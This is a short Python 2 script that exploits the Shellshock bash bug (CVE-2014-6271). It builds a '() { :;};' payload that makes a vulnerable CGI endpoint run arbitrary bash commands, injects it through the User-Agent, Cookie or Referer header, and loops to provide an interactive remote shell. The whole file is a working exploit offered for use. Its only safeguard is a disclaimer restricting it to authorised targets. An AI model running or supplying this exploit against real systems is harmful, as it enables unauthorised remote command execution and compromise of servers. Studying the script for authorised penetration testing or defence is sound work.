#!/usr/bin/env python
# File name: shellshock.py
# Author: Sagi Levy - Sagi@pwnguy.com
# Date created: 27/09/2014
# Python Version: 2.7
# Description: 	A simple shell-like exploit for the Shellschok CVE-2014-6271 bug.
#		Use it to exploit known vulnerable URLs
#		This tool may be used only on your own authorized URLs. The author  
#		of this tool takes no responsibility for its usage.
# Example:	./shellshock.py -u http://localhost/cgi-bin/bash.sh

import sys
import urllib2
import argparse
import readline

def main():
	# Parse args
	parser = argparse.ArgumentParser()
	parser.add_argument("-u", help="exploit User-Agent parameter", action="store_true")
	parser.add_argument("-c", help="exploit Cookie parameter", action="store_true")
	parser.add_argument("-r", help="exploit Referer parameter", action="store_true")
	parser.add_argument("URL", help="Shellshock vulnerable URL")
	args = parser.parse_args()

	try:
		while True:
			cmd = raw_input("> ")
			if cmd.strip() == 'exit':
				break

			injection = "() { :;}; echo \"Content-Type: text/html\"; echo; echo; /bin/bash -c \"" + cmd + "\""

			# Make a HTTP request
			request = urllib2.Request(args.URL)	
			if args.u:
		    		request.add_header("User-Agent", injection)
			if args.c:
		    		request.add_header("Cookie", injection)
			if args.r:
		    		request.add_header("Referer", injection)
			result = urllib2.urlopen(request).read()
		
			print result.strip()
	except:
   		print sys.exc_info()[1]

if __name__ == "__main__":
   main()
